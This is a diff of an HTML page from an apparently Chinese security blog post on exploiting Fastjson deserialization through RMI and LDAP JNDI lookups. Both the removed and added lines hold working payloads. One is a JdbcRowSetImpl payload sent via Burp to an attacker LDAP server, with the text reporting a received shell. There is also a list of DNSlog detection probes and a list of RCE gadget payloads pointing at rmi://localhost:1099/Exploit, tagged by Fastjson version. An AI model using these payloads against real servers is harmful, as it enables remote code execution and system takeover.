@@ -141,8 +141,7 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<h2 id="一-漏洞利用">一、漏洞利用</h2>
-<h2 id="0x00-rmi和ldap的适用版本">0x00 RMI和LDAP的适用版本</h2>
+				<h2 id="0x00-rmi和ldap的适用版本">0x00 RMI和LDAP的适用版本</h2>
 <ul>
 <li>
 <p><strong>漏洞检测</strong>: https://github.com/uknowsec/BurpSuite-Extender-fastjson</p>
@@ -214,75 +213,70 @@ public class Loecho {
 </li>
 <li>
 <p>BurpSuit 发送Payload,内容如下:</p>
-<pre><code class="language-json">
-{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:PORT/类名&quot;,&quot;autoCommit&quot;:true}}}
-
-</code></pre>
-<figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611151357328.png" alt="image-20200611151357328" loading="lazy"></figure>
 </li>
 </ol>
+<pre><code class="language-json">{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:PORT/类名&quot;,&quot;autoCommit&quot;:true}}}   
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611151357328.png" alt="image-20200611151357328" loading="lazy"></figure>
 <p>4.查看监听位置的请求,接受到Shell:</p>
 <figure data-type="image" tabindex="8"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611151659799.png" alt="image-20200611151659799" loading="lazy"></figure>
 <ol start="5">
 <li>提供一些绕墙的Payload,网上总结:</li>
 </ol>
-<p><strong>手工探测Payload</strong></p>
-<pre><code> ```json
-
- {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://dnslog&quot;}}&quot;&quot;}
- 
- Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}]
- 
- Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}
+<p>手工探测Payload</p>
+<pre><code class="language-json">     {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://dnslog&quot;}}&quot;&quot;}
      
- {{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}:0
- 
- 
- {&quot;@type&quot;:&quot;java.net.Inet4Address&quot;, &quot;val&quot;:&quot;dnslog&quot;}
- 
- {&quot;@type&quot;:&quot;java.net.Inet6Address&quot;, &quot;val&quot;:&quot;dnslog&quot;}
- 
- {&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:, &quot;val&quot;:&quot;dnslog&quot;}}
- 
- {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, 
-  &quot;val&quot;:&quot;dnslog&quot;}}&quot;&quot;}
- 
- {{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}:&quot;aaa&quot;}
- 
- Set[{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}]
- 
- Set[{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}
+     Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}]
      
- {{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}:0
- ```
-</code></pre>
-<p><strong>RCE-Payload</strong></p>
-<pre><code class="language-json">
-{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;&quot;autoCommit&quot;:true}
- 
-{&quot;@type&quot;:&quot;LLcom.sun.rowset.RowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true} 1.2.42
+     Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}
+         
+     {{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}:0
+     
+     
+     {&quot;@type&quot;:&quot;java.net.Inet4Address&quot;, &quot;val&quot;:&quot;dnslog&quot;}
+     
+     {&quot;@type&quot;:&quot;java.net.Inet6Address&quot;, &quot;val&quot;:&quot;dnslog&quot;}
+     
+     {&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:, &quot;val&quot;:&quot;dnslog&quot;}}
+     
+     {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, 
+      &quot;val&quot;:&quot;dnslog&quot;}}&quot;&quot;}
+     
+     {{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}:&quot;aaa&quot;}
+     
+     Set[{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}]
+     
+     Set[{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}
+         
+     {{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}:0
+    
 
-{&quot;@type&quot;:&quot;[com.sun.rowset.RowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true} 1.2.25v1.2.43
-
-{&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;：&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;}} 1.2.25
-
-{&quot;@type&quot;:&quot;Lcom.sun.rowset.RowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}
-
-{\&quot;@type\&quot;:\&quot;com.zaxxer.hikari.HikariConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.60
- 
-{\&quot;@type\&quot;:\&quot;org.apache.commons.configuration.JNDIConfiguration\&quot;,\&quot;prefix\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.60
- 
-{\&quot;@type\&quot;:\&quot;org.apache.commons.configuration2.JNDIConfiguration\&quot;,\&quot;prefix\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.61
- 
-{\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;}  1.2.62
- 
-{\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;} AnterosDBCPConfig
- 
-{\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;} AnterosDBCPConfig
- 
-{\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;:{\&quot;UserTransaction\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;}} JtaTransactionConfig
+RCE-Payload
 
 
+   {&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;&quot;autoCommit&quot;:true}
+    
+   {&quot;@type&quot;:&quot;LLcom.sun.rowset.RowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true} 1.2.42
+   
+   {&quot;@type&quot;:&quot;[com.sun.rowset.RowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true} 1.2.25v1.2.43
+   
+   {&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;：&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;}} 1.2.25
+   
+   {&quot;@type&quot;:&quot;Lcom.sun.rowset.RowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}
+   
+   {\&quot;@type\&quot;:\&quot;com.zaxxer.hikari.HikariConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.60
+    
+   {\&quot;@type\&quot;:\&quot;org.apache.commons.configuration.JNDIConfiguration\&quot;,\&quot;prefix\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.60
+    
+   {\&quot;@type\&quot;:\&quot;org.apache.commons.configuration2.JNDIConfiguration\&quot;,\&quot;prefix\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.61
+    
+   {\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;}  1.2.62
+    
+   {\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;} AnterosDBCPConfig
+    
+   {\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;} AnterosDBCPConfig
+    
+   {\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;:{\&quot;UserTransaction\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;}} JtaTransactionConfig
 </code></pre>
 
 							</div>
